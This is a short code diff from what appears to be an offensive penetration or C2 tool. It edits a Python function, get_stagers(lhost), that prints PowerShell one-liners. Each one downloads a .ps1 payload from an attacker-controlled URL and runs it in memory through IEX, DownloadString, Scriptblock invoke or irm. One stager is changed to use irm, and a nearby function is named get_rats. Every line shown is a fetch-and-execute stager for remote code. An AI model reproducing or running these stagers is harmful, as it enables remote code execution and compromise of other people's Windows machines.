@@ -466,7 +466,7 @@ def get_stagers(lhost):
     pretty_print("  (iwr -UseBasicParsing " + url + "ps1).Content|IEX")
     pretty_print('  $ExecutionContext.InvokeCommand.InvokeScript([net.webclient]::new().DownloadString("' + url + 'ps1"))')
     pretty_print('  [Scriptblock]::Create([net.webclient]::new().DownloadString("' + url + 'ps1")).invoke()')
-    pretty_print('  [Management.Automation.PowerShell]::Create().addscript([net.webclient]::new().DownloadString("' + url + 'ps1")).invoke()')
+    pretty_print('  [Management.Automation.PowerShell]::Create().addscript((irm ' + url + 'ps1)).invoke()')
     pretty_print("")
 
 def get_rats(current=""):
